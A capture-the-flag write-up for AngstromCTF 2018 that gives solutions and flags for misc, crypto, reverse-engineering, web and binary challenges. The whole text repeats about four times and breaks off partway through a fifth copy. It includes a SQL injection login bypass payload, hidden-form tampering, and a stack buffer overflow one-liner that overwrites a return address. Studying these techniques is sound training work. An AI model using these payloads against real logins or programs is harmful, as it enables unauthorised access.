# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
